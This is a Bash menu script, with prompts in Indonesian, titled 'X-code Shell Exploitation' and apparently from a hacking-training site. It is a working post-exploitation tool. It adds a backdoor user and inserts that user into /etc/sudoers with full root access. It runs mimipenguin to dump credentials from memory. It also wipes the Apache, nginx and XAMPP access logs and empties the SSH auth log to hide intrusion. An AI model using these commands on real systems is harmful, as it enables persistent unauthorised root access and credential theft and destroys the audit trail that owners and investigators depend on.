#!/bin/bash
# Progammer : Kurniawan. trainingxcode@gmail.com. xcode.or.id
# Program ini dapat digunakan untuk personal ataupun komersial.
# X-code Media - xcode.or.id / xcodetraining.com

again='y'
while [[ $again == 'Y' ]] || [[ $again == 'y' ]];
do
clear
echo "=================================================================";
echo " X-code Shell Exploitation                                       ";
echo " Progammer : Kurniawan. xcode.or.id                              ";
echo " Version 0.3 - 09/05/2020                                        ";
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=";
echo " Membuat backdoor account                                        ";
echo " [1]  Cek apakah server menggunakan ubuntu / linux mint / lainnya";
echo " [2]  Tambah user di linux                                       ";
echo " [3]  Lihat user di linux di /etc/passwd                         ";
echo " [4]  Jadikan user di linux mempunyai akses root                 ";
echo " [5]  Cek apakah user sudah ada di /etc/sudoers                  ";
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=";
echo " Mimipenguin                                                     ";
echo " [6] Jalankan mimipenguin                                        ";
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=";
echo " Penghapusan log                                                 ";
echo " [7]  Cek semua log yang ada di server                           ";
echo " [8]  Lihat isi semua log yang ada di server                     ";
echo " [9]  Cara cek log history                                       ";
echo " [10] Menghapus log akses apache2                                ";
echo " [11] Menghapus log akses nginx                                  ";
echo " [12] Menghapus log akses apache XAMPP                           ";
echo " [13] Menghapus log akses SSH                                    ";
echo " [14] Menghapus semua log server                                 ";
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=";
echo " [15] Exit                                                      ";
echo "=================================================================";
read -p " Masukkan Nomor Pilihan Anda antara [1 - 15] : " choice;
echo "";
case $choice in
1)
    if [ -f /etc/os-release ]; then
        cat /etc/os-release
    elif [ -f /etc/redhat-release ]; then
        cat /etc/redhat-release
    elif [ -f /etc/lsb-release ]; then
        cat /etc/lsb-release
    else
        echo "Tidak dapat mendeteksi distribusi Linux."
    fi
    ;;
2)  echo -n "Masukkan nama user yang akan ditambah : "
    read namauser
    useradd $namauser
    passwd $namauser
    ;;
3)  cat /etc/passwd
    ;;
4)  echo -n "Masukkan nama user yang akan diberikan akses root : "
    read namauser
    sed -i "/root/i\\$namauser ALL=(ALL:ALL) ALL" /etc/sudoers
    echo "User $namauser telah diberikan akses root."
    ;;
5)  cat /etc/sudoers
    ;;
6)  echo "Harap ditunggu, mimipenguin sedang bekerja..."
    ./mimipenguin/mimipenguin.sh
    ;;
7)  ls -l /var/log
    ;;
8)  echo -n "Masukkan nama log yang ingin dilihat: "
    read logfile
    if [ -f "/var/log/$logfile" ]; then
        cat "/var/log/$logfile" | more
    else
        echo "Log file tidak ditemukan."
    fi
    ;;
9)  echo "Untuk melihat log history, gunakan perintah berikut:"
    echo "cat ~/.bash_history"
    ;;
10) echo "Menghapus log akses apache2..."
    rm -rf /var/log/apache2/access*
    echo "Log akses apache2 telah dihapus."
    ;;
11) echo "Menghapus log akses nginx..."
    rm -rf /var/log/nginx/access*
    echo "Log akses nginx telah dihapus."
    ;;
12) echo "Menghapus log akses apache XAMPP..."
    rm -rf /opt/lampp/logs/access*
    echo "Log akses XAMPP telah dihapus."
    ;;
13) echo "Menghapus log akses SSH..."
    > /var/log/auth.log
    echo "Log akses SSH telah dihapus."
    ;;
14) echo "Menghapus semua log server..."
    rm -rf /var/log/apache2/access*
    rm -rf /var/log/nginx/access*
    rm -rf /opt/lampp/logs/access*
    > /var/log/auth.log
    echo "Semua log server telah dihapus."
    ;;
15) exit
    ;;
*)    echo "Maaf, menu tidak ada"
esac
echo ""
echo "X-code Shell Exploitation"
echo "Oleh Kurniawan - trainingxcode@gmail.com. xcode.or.id"
echo ""
echo -n "Kembali ke menu? [y/n]: ";
read again;
while [[ $again != 'Y' ]] && [[ $again != 'y' ]] && [[ $again != 'N' ]] && [[ $again != 'n' ]];
do
echo "Masukkan yang anda pilih tidak ada di menu";
echo -n "Kembali ke menu? [y/n]: ";
read again;
done
done